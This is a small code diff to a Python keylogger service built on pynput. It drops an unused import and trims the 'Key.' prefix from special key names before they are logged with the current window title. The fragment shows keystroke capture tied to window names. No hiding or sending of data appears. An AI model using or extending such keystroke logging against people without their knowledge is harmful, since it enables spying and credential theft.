@@ -1,5 +1,3 @@
-import time
-
 from pynput.keyboard import Key, Controller
 
 from pynput import keyboard
@@ -27,6 +25,8 @@ class KeyLoggerService(IKeloggerService):
                 formated = format(key.char)
             except:
                 formated = format(key)
+            if len(formated) > 1:
+                formated = formated[4:]
 
             current_screen = self.__window_name
 
